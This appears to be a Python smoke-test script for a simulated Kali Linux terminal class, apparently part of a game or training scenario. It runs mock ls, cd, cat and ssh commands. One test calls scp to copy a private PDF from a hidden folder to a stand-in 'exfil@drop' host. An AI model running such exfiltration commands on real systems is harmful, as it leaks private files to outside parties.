#!/usr/bin/env python3
"""
Runner simples de smoke tests para utils.terminal_kali.TerminalKali
"""
import sys
import time
from utils.terminal_kali import TerminalKali


def test_ls_cd_cat_scp():
    t = TerminalKali('root','kali')
    print('cwd initial:', t.cwd)

    print('\nTest: ls ~')
    t._cmd_ls([])

    print('\nTest: cat ~/.hidden')
    ok = t._cmd_cat(['.hidden'])
    print('cat returned:', ok)

    print('\nTest: cd Private && ls')
    t._cmd_cd(['Private'])
    print('cwd after cd:', t.cwd)
    t._cmd_ls([])

    print('\nTest: scp existing file')
    t._cmd_scp(['~/Private/.conversa_hotel_nobile.pdf', 'exfil@drop:~/'])

    print('\nTest: scp missing file (should error)')
    t._cmd_scp(['~/Private/does_not_exist.txt', 'exfil@drop:~/'])

    print('\nTest: ssh to backup-cloud (should connect)')
    t._cmd_ssh(['admin@backup-cloud'])

    print('\nAll tests done')


if __name__ == '__main__':
    test_ls_cd_cat_scp()
